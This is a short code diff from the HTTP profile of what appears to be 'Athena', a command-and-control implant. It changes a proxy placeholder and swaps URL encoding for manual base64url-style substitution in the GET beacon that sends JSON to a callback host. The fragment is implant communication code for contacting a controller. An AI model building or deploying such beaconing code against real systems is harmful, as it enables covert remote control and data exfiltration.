@@ -48,7 +48,7 @@ namespace Athena.Profiles.HTTP
             this.hostHeader = "%HOSTHEADER%";
             this.getURL = $"{callbackHost}:{callbackPort}/{getUri}?{queryPath}=";
             this.postURL = $"{callbackHost}:{callbackPort}/{postUri}";
-            this.proxyHost = "proxy_host:proxy_port";
+            this.proxyHost = ":";
             this.proxyPass = "proxy_pass";
             this.proxyUser = "proxy_user";
             this.psk = "AESPSK";
@@ -202,7 +202,7 @@ namespace Athena.Profiles.HTTP
                 if (json.Length < 2000) //Max URL length
                 {
                     Debug.WriteLine($"[{DateTime.Now}] Sending as GET");
-                    response = await this.client.GetAsync(this.getURL + WebUtility.UrlEncode(json));
+                    response = await this.client.GetAsync(this.getURL + json.Replace("=", "").Replace('+', '-').Replace('/', '_'));
                 }
                 else
                 {
